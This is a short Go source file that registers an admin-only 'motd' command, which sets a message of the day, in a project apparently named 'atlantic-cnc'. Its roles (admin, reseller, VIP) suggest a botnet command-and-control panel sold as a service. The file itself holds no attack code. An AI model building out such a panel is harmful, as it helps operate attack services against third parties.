package util_Command

import (
	"atlantic-cnc/core/functions"
        "atlantic-cnc/core/sessions/sessions"
        "strings"
)

var Motd string

func init() {

	Register(&Command{
		Name: "motd",

		Description: "set a message of the day",

		Admin: true,
		Reseller: false,
		Vip: false,

                Execute: func(Session *sessions.Session_Store, cmd []string) error {
                        if len(cmd) <= 1 {
                                Session.Channel.Write([]byte("Syntax invaild -> motd [Message]\r\n"))
                                return nil
                        }

                        Motd = strings.ReplaceAll(strings.Join(cmd, " "), cmd[0], "")

                        functions.MOTD = Motd

                        Session.Channel.Write([]byte("New MOTD: "+Motd+"\r\n"))
                        return nil
		},
	})
}
